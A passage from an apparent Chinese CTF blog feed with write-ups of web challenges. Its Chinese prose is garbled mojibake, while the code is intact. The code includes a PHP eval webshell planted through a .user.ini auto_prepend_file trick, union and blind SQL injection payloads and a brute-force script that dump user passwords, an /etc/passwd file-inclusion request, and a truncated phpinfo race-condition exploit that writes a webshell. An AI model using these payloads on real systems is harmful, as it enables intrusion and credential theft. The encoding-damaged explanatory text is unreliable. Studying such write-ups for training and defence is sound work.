class="line">&gt;auto_prepend_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå½“æˆ‘ä»¬è®¿é—®æ­¤ç›®å½•ä¸‹çš„ä»»ä½•ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå»åŒ…å«test.jpg</p><p>å¸¸è§å§¿åŠ¿ï¼š</p><p>æ¯”å¦‚ï¼ŒæŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œä½ ä¾¿å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚ä¸è¿‡å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚ </p></blockquote><p>è¿™é‡Œæœ€åå°±è¦å†™ä¸€ä¸ªå›¾ç‰‡é©¬äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠä¸¤ä¸ªä¸Šä¼ ï¼Œè¿èœåˆ€å°±å¯ä»¥æ‹¿åˆ°flagäº†</p><p><strong>ä¸»è¦æ¥å­¦ä¹ ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ çš„æ“ä½œ</strong></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>è¿™ä¸ªç›´æ¥ä¸Šä¼ å°±å¯ä»¥ï¼Œæ”¹ä¸€ä¸‹æ–‡ä»¶å†…å®¹çš„å¤´ï¼Œç„¶åæ”¹ä¸‹æ–‡ä»¶åphtml</p><p>èœåˆ€è¿æ¥æ‹¿flag</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>å¤‡ä»½æ–‡ä»¶index.php.bak</p><p>ä¸¤ä¸ªç­‰å·å¼±ç­‰äºï¼Œç›´æ¥123æ‹¿flag</p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>ä¸Šä¼ æ”¹åå­—ï¼Œæ‹¿flag</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>ç›´æ¥èœåˆ€è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æœ‰flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;BUU-Web&quot;&gt;&lt;a href=&quot;#BUU-Web&quot; class=&quot;headerlink&quot; title=&quot;BUU(Web)&quot;&gt;&lt;/a&gt;BUU(Web)&lt;/h1&gt;&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;</summary>
      
    
    
    
    <category term="BUU" scheme="https://pz1o.top/categories/BUU/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="åˆ·é¢˜" scheme="https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF2020</title>
    <link href="https://pz1o.top/2020/09/25/CUMTCTF2020/"/>
    <id>https://pz1o.top/2020/09/25/CUMTCTF2020/</id>
    <published>2020-09-25T11:00:00.000Z</published>
    <updated>2020-11-20T14:18:32.426Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><p>ç¬¬ä¸€æ¬¡æ‰“æ¯”èµ›ï¼Œå¤§ä¸‰çš„å¸ˆå‚…ä»¬å¥½å¼º</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Webç­¾åˆ°"><a href="#Webç­¾åˆ°" class="headerlink" title="Webç­¾åˆ°"></a>Webç­¾åˆ°</h2><p><img src="/2020/09/25/CUMTCTF2020/image-20200925183359837.png" alt="image-20200925183359837"></p><p>getä¼ å…¥å‚æ•°1ï¼Œpostä¼ å…¥å‚æ•°2ï¼Œç„¶åæ–‡ä»¶åŒ…å«flag.phpï¼ŒæŸ¥çœ‹æºç æ‹¿flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#CUMTCTF&#123;179055b4-e8f5-42d2-bfe4-027d15e946b2&#125;</span><br></pre></td></tr></table></figure><h2 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h2><p>è¿‡æ»¤ç©ºæ ¼çš„sqlæ³¨å…¥ï¼Œå¯ä»¥ç”¨/**/ç»•è¿‡,ç”¨unionæ³¨å…¥</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥è¡¨</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),5,6,7,8#</span><br><span class="line">#emails,users</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;emails&#39;),5,6,7,8#</span><br><span class="line">#id,email_id</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;),5,6,7,8#</span><br><span class="line">#user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users),5,6,7,8#</span><br><span class="line">#CUMTCTF&#123;27ec8034-c9fe-0cfd-d92a-84362ecf0e42&#125;</span><br></pre></td></tr></table></figure><h2 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;secret.jpg</span><br></pre></td></tr></table></figure><p>ç›´æ¥çœ‹å›¾ç‰‡çš„æºä»£ç ï¼Œå‘ç°åé¢æœ‰php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'param1'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $str1=$_GET[<span class="string">'param1'</span>];</span><br><span class="line">    <span class="keyword">if</span>(file_get_contents($str1)!==<span class="string">'Suvin_wants_a_girlfriend'</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Suvin doesn't like you"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">        $str2=$_GET[<span class="string">'param2'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($str2))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Suvin prefers strings of Numbers'</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>($str2&lt;<span class="number">3600</span>*<span class="number">24</span>*<span class="number">30</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Suvin says the num is too short'</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>($str2&gt;<span class="number">3600</span>*<span class="number">24</span>*<span class="number">31</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Suvin says the num is too long'</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Suvin says he's falling in love with you!"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            sleep(intval($str2)); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'param1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'param2'</span>])) &#123;</span><br><span class="line">            $str1=$_POST[<span class="string">'param1'</span>];</span><br><span class="line">            $str2=$_POST[<span class="string">'param2'</span>];</span><br><span class="line">            <span class="keyword">if</span>(strlen($str1)&gt;<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"It's too long"</span>);</span><br><span class="line">            <span class="keyword">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"It's so similar to md5"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆgetä¼ å…¥param1è¦å’Œä¸€ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰å¯ä»¥ç”¨data://</p><p>getä¼ å…¥param2è¦åˆ¤æ–­è¿™ä¸ªå‚æ•°æ˜¯å¦æ˜¯æ•°å­—å¹¶ä¸”è¦é™åˆ¶äº†èŒƒå›´ï¼Œåœ¨åŠ ä¸Šæœ‰sleepï¼Œå¾ˆè‡ªç„¶çš„å°±æƒ³åˆ°äº†ç§‘å­¦è®¡æ•°æ³•</p><p>å› æ­¤payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;index.php?param2&#x3D;0.26e07&amp;param1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Suvin_wants_a_girlfriend</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯postçš„ä¸¤ä¸ªå‚æ•°è¦çš„æ˜¯å­—ç¬¦ä¸²ä¸‹çš„å‚æ•°1å’Œå‚æ•°2ä¸å¼ºç­‰ï¼Œä½†sha1åŠ å¯†å¼ºç­‰ï¼Œè¿™é‡Œå°±ä¸èƒ½ç”¨zheæ•°ç»„ç»•è¿‡äº†</p><p>è¿™é‡Œæ‰¾ä¸¤ä¸ªsha1åŠ å¯†çš„ä¸ä¸€æ ·çš„å­—ç¬¦ä¸²,æ‰¾çš„æ˜¯é‚£ä¸ªpdfï¼Œç„¶åæå–å‰é¢çš„å†…å®¹å³å¯ï¼Œæœ€åæŠ“åŒ…æ”¹å‚æ•°1å’Œå‚æ•°2æ‹¿flag</p><p><img src="/2020/09/25/CUMTCTF2020/image-20200925185006355.png" alt="image-20200925185006355"></p><h2 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h2><p>è¿‡æ»¤äº†<strong>å•å¼•å·å’Œå­—ç¬¦ä¸²æˆªæ–­å‡½æ•°substr()å’Œmid()</strong>å¹¶ä¸”æ— å›æ˜¾ï¼Œå› ä¸ºæœ‰æ­£ç¡®å’Œé”™è¯¯ç™»å½•ç•Œé¢é‚£åº”è¯¥å°±æ˜¯ç›²æ³¨äº†</p><p>è¿™é‡Œç”¨leftæ¥æˆªå–å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ç”¨åå…­è¿›åˆ¶æ¥æ›¿æ¢å•å¼•å·åŠå…¶é‡Œé¢çš„å†…å®¹</p><p>ç›´æ¥æ”¾è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.-&#123;&#125;,'</span></span><br><span class="line">dict=<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">'http://202.119.201.197:13004/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">j = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dict:</span><br><span class="line">        <span class="comment">#payload = "or/**/1=(case/**/when/**/(left(database(),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#".format(i, binascii.b2a_hex(j + a))</span></span><br><span class="line">        <span class="comment">#payload = "or/**/1=(case/**/when/**/(left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#".format(i,binascii.b2a_hex(j+a))</span></span><br><span class="line">        <span class="comment">#payload = "or/**/1=(case/**/when/**/(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#".format(i,binascii.b2a_hex(j + a))</span></span><br><span class="line">        payload = <span class="string">"or/**/1=(case/**/when/**/(left((select/**/group_concat(password)/**/from/**/users),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#"</span>.format(i, binascii.b2a_hex(j + a))</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        <span class="comment">#cumtctf</span></span><br><span class="line">        <span class="comment">#emails users</span></span><br><span class="line">        <span class="comment">#id id username,password</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span> : <span class="string">"100\\"</span>,</span><br><span class="line">            <span class="string">'password'</span> : payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.session()</span><br><span class="line">        res = r.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(res.content)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Wrong username'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            j += a</span><br><span class="line">            flag +=a</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>å¥½åƒæ˜¯åœ¨æœ€åï¼Œå¤šè·‘ä¸€ä¼šå°±å‡ºæ¥äº†</p><h2 id="Try-GET-file"><a href="#Try-GET-file" class="headerlink" title="Try:GET_file"></a>Try:GET_file</h2><p>å…ˆæ‰«ç›®å½•å‘ç°æœ‰phpinfo.php</p><p>åŒ…å«ä¸€ä¸‹å‘ç°æœ‰æ–‡ä»¶åŒ…å«æ¼æ´</p><p>ä¹‹ååˆåŒ…å«æ•æ„Ÿæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="/2020/09/25/CUMTCTF2020/image-20200925185651724.png" alt="image-20200925185651724"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªphpinfoä¸Šä¼ æ–‡ä»¶å†åŒ…å«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºè®¿é—®çš„ä»£ç ä¸­æ˜¯å¦æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼Œphpéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯&#x2F;tmp&#x2F;php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œè¿™ä¸ªä¸´æ—¶æ–‡ä»¶åœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ï¼ŒåŒæ—¶ï¼Œphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ã€‚ä½†æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ã€‚</span><br><span class="line"></span><br><span class="line">å› ä¸ºåœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«åˆ é™¤ï¼Œç¬¬äºŒä¸ªè¯·æ±‚å°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯è¿™å¹¶ä¸ä»£è¡¨æˆ‘ä»¬æ²¡æœ‰åŠæ³•å»åˆ©ç”¨è¿™ç‚¹ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œåªè¦å‘é€è¶³å¤Ÿå¤šçš„æ•°æ®ï¼Œè®©é¡µé¢è¿˜æœªååº”è¿‡æ¥ï¼Œå°±ä¸Šä¼ æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ï¼Œç„¶åæ–‡ä»¶åŒ…å«ï¼š</span><br><span class="line"></span><br><span class="line">1ï¼‰å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerï¼Œgetç­‰ä½ç½®ä¸€å®šè¦å¡æ»¡åƒåœ¾æ•°æ®ï¼›</span><br><span class="line"></span><br><span class="line">2ï¼‰phpinfoè¿™æ—¶ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œå…¶ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†phpinfoæ’‘å¾—éå¸¸å¤§</span><br><span class="line"></span><br><span class="line">3ï¼‰PHPé»˜è®¤ç¼“å†²åŒºå¤§å°æ˜¯4096ï¼Œå³PHPæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥</span><br><span class="line"></span><br><span class="line">4ï¼‰æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ï¼Œåªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…</span><br><span class="line"></span><br><span class="line">5ï¼‰æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å…¶å®è¿˜æ²¡æœ‰ç»“æŸï¼Œä½†æ˜¯PHPè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶è¿˜æœªè¢«åˆ é™¤</span><br><span class="line"></span><br><span class="line">6ï¼‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼ŒæˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ågetshell</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ç°æˆçš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span 